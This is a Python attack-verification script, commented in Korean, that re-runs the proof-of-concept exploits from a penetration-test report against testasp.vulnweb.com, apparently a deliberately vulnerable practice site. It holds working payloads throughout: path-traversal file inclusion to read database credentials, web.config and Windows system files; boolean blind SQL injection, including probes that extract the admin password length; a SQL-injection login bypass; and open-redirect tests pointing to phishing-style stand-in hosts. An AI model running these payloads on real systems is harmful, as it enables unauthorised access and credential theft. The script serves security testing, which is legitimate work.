#!/usr/bin/env python3
"""Round 14 — 보고서 정합성 최종 점검 (읽기 전용).
목적: DB 리셋 이후에도 보고서의 PoC 명령이 그대로 재현되는지, 하드코딩된 id/행수가
      아직 유효한지 확인하고 오픈 리다이렉트 4곳을 정확히 분류한다.
쓰기 0건 (로그인 POST 는 상태 변경 아님 · 회원가입/게시글 작성 없음).
"""
import re
import urllib.error
import urllib.parse
import urllib.request

BASE = "http://testasp.vulnweb.com"
N = [0]
out = {}


class _NoRedirect(urllib.request.HTTPRedirectHandler):
    """302 를 따라가지 않고 원 응답(Location 포함)을 그대로 관측한다."""
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


OPENER = urllib.request.build_opener(_NoRedirect)


def req(path, data=None, method=None):
    N[0] += 1
    url = BASE + path
    if data is not None:
        b = urllib.parse.urlencode(data).encode()
        r = urllib.request.Request(url, data=b, method=method or "POST")
    else:
        r = urllib.request.Request(url, method=method or "GET")
    try:
        with OPENER.open(r, timeout=30) as resp:
            return resp.status, resp.read().decode("latin-1", "replace"), dict(resp.headers)
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("latin-1", "replace"), dict(e.headers)
    except Exception as e:
        return 0, str(e)[:120], {}


def hdr(h, k="Location"):
    for kk, vv in h.items():
        if kk.lower() == k.lower():
            return vv
    return None


print("### A. 보고서 헤드라인 PoC 재현성 (오늘 시점)")

# A1. LFI — 자격증명
st, b, _ = req("/Templatize.asp?item=db.asp")
m = re.search(r"Provider=[^<\r\n]{0,160}", b)
print(f"  A1 LFI db.asp            {st} {len(b):6d}B  creds={'YES' if m else 'NO'}")
out["lfi_db_asp"] = {"status": st, "size": len(b), "creds": bool(m)}

# A2. LFI — 웹루트 밖
for label, item in [("A2 LFI win.ini", "..%2f..%2fwindows%2fwin.ini"),
                    ("A3 LFI web.config", "web.config"),
                    ("A4 LFI unattend", "..%2f..%2fwindows%2fpanther%2funattend.xml")]:
    st, b, _ = req("/Templatize.asp?item=" + item)
    print(f"  {label:24s} {st} {len(b):6d}B")
    out[label.split()[1]] = {"status": st, "size": len(b)}

# A5. search.asp SQLi — TRUE/FALSE (행수는 리셋으로 변동 가능 → 범위로 기록)
def sq(cond):
    st, b, _ = req("/search.asp?tfSearch=" + urllib.parse.quote("zzq')>0 OR (" + cond + "))--", safe=""))
    return st, b.count("class='posttext'")


t_st, t_n = sq("(1=1)")
f_st, f_n = sq("(1=2)")
print(f"  A5 search.asp (1=1)      {t_st} posttext={t_n}   ← TRUE 기준값")
print(f"  A6 search.asp (1=2)      {f_st} posttext={f_n}   ← FALSE 기준값")
out["search_sqli"] = {"true_status": t_st, "true_rows": t_n, "false_status": f_st, "false_rows": f_n}
st, b, _ = req("/search.asp?tfSearch=" + urllib.parse.quote("zzq')>0 OR ((SELECT SYSTEM_USER)='acunetix'))--", safe=""))
print(f"  A7 SYSTEM_USER='acunetix' {st} posttext={b.count(chr(39)+'posttext'+chr(39))}")
out["search_sysuser_true"] = b.count("class='posttext'")

# A8. id SQLi — 실제 존재하는 스레드/포럼 id 를 먼저 찾는다
st, home, _ = req("/Default.asp")
fids = sorted(set(re.findall(r"showforum\.asp\?id=(\d+)", home, re.I)))
tids = sorted(set(re.findall(r"showthread\.asp\?id=(\d+)", home, re.I)))
print(f"  A8 Default.asp 링크: forum ids={fids}  thread ids={tids}")
out["existing_ids"] = {"forum": fids, "thread": tids}
if fids:
    fid = fids[0]
    a = req(f"/showforum.asp?id=" + urllib.parse.quote(f"{fid} AND 1=1", safe=""))[0]
    b_ = req(f"/showforum.asp?id=" + urllib.parse.quote(f"{fid} AND 1=2", safe=""))[0]
    print(f"  A9 showforum id={fid}: AND 1=1 → {a} / AND 1=2 → {b_}")
    out["showforum_sqli"] = {"id": fid, "true": a, "false": b_}
if tids:
    tid = tids[0]
    a = req(f"/showthread.asp?id=" + urllib.parse.quote(f"{tid} AND 1=1", safe=""))[0]
    b_ = req(f"/showthread.asp?id=" + urllib.parse.quote(f"{tid} AND 1=2", safe=""))[0]
    print(f"  A10 showthread id={tid}: AND 1=1 → {a} / AND 1=2 → {b_}")
    out["showthread_sqli"] = {"id": tid, "true": a, "false": b_}

# A11. 저장형 XSS 렌더 조건 재확인(현재 상태 — 우리 페이로드는 리셋으로 사라짐)
st, b, _ = req("/showthread.asp?id=0")
print(f"  A11 showthread id=0      {st} posttext={b.count(chr(39)+'posttext'+chr(39))} (우리 페이로드 잔존={'YES' if 'onerror' in b else 'NO'} ← 리셋으로 소실)")
out["stored_xss_artifact_gone"] = "onerror" not in b

# A12. _vti_cnf
st, b, _ = req("/_vti_cnf/Default.asp")
m = re.search(r"vti_extenderversion:SR\|([\d.]+)", b)
print(f"  A12 _vti_cnf/Default.asp {st} {len(b):5d}B vti_extenderversion={m.group(1) if m else '?'}")
out["vti_cnf"] = {"status": st, "size": len(b), "version": m.group(1) if m else None}

print()
print("### B. 오픈 리다이렉트 4곳 — 정확한 분류 (Location 실측)")
variants = [
    ("http://example.com/", "http%3A%2F%2Fexample.com%2F"),
    ("//evil.example/p", "%2F%2Fevil.example%2Fp"),
    ("https://attacker.tld/phish", "https%3A%2F%2Fattacker.tld%2Fphish"),
    ("/\\evil.example (백슬래시)", "%2F%5Cevil.example"),
    ("\\/evil.example", "%5C%2Fevil.example"),
    ("https:example.com (스킴만)", "https%3Aexample.com"),
    ("%09//evil.example (탭)", "%09%2F%2Fevil.example"),
    ("(대조군 없음)", ""),
]
rows = []
print("  [Logout.asp  GET · 무인증]")
for label, enc in variants:
    st, _, h = req("/Logout.asp?RetURL=" + enc)
    loc = hdr(h) or ""
    print(f"    {label:28s} {st} → {loc}")
    rows.append({"site": "Logout.asp", "input": label, "status": st, "location": loc})
print("  [Login.asp  GET (POST 성공 전)]")
st, _, h = req("/Login.asp?RetURL=http%3A%2F%2Fexample.com%2F")
print(f"    GET http://example.com/     {st} → {hdr(h) or '(리다이렉트 없음)'}  ⇒ POST 성공이 선행 조건")
rows.append({"site": "Login.asp", "input": "GET http://example.com/", "status": st, "location": hdr(h) or ""})
print("  [Login.asp  POST + SQLi 우회]")
st, b2, h = req("/Login.asp?RetURL=http%3A%2F%2Fexample.com%2F",
                {"tfUName": "admin", "tfUPass": "x' OR '1'='1"})
print(f"    POST 우회+RetURL            {st} → {hdr(h) or '(없음)'}")
rows.append({"site": "Login.asp POST", "input": "SQLi bypass + http://example.com/", "status": st, "location": hdr(h) or ""})
print("  [Register.asp  GET (POST 성공 전)]")
st, _, h = req("/Register.asp?RetURL=http%3A%2F%2Fexample.com%2F")
print(f"    GET http://example.com/     {st} → {hdr(h) or '(리다이렉트 없음)'}  ⇒ 성공한 등록 POST 가 선행 조건")
rows.append({"site": "Register.asp", "input": "GET http://example.com/", "status": st, "location": hdr(h) or ""})
print("  [Templatize.asp  RetURL 사용 방식]")
st, b3, h = req("/Templatize.asp?item=html/about.html&RetURL=http%3A%2F%2Fexample.com%2F")
leak = "example.com" in b3
print(f"    GET +RetURL                 {st} → {hdr(h) or '(리다이렉트 없음)'} / 본문에 URL 반영={leak} → 링크 생성용(리다이렉트 아님)")
rows.append({"site": "Templatize.asp", "input": "RetURL=http://example.com/", "status": st, "location": hdr(h) or ""})
out["redirect_matrix"] = rows

print()
print("### C. admin 계정/자격증명 사실 재확인 (리셋 후에도 동일한가)")
sysu = req("/search.asp?tfSearch=" + urllib.parse.quote("zzq')>0 OR ((SELECT COUNT(*) FROM users WHERE uname='admin')>0))--", safe=""))
print(f"  admin 행 존재?          posttext={sysu[1].count(chr(39)+'posttext'+chr(39))} (0 초과면 TRUE)")
pwlen = req("/search.asp?tfSearch=" + urllib.parse.quote("zzq')>0 OR ((SELECT LEN(upass) FROM users WHERE uname='admin')=4))--", safe=""))
print(f"  upass 길이 4?           posttext={pwlen[1].count(chr(39)+'posttext'+chr(39))}")
rows_old = req("/search.asp?tfSearch=" + urllib.parse.quote("zzq')>0 OR ((SELECT COUNT(*) FROM users WHERE uname='rt12x')>0))--", safe=""))
print(f"  Round13 주입 행 잔존?   posttext={rows_old[1].count(chr(39)+'posttext'+chr(39))} (0 이면 리셋으로 소실)")

out["requests"] = N[0]
import json
with open("out/consistency.json", "w", encoding="utf-8") as f:
    json.dump(out, f, ensure_ascii=False, indent=2)
print(f"\n### 완료 — 총 요청 {N[0]}건 (쓰기 0건) → out/consistency.json")
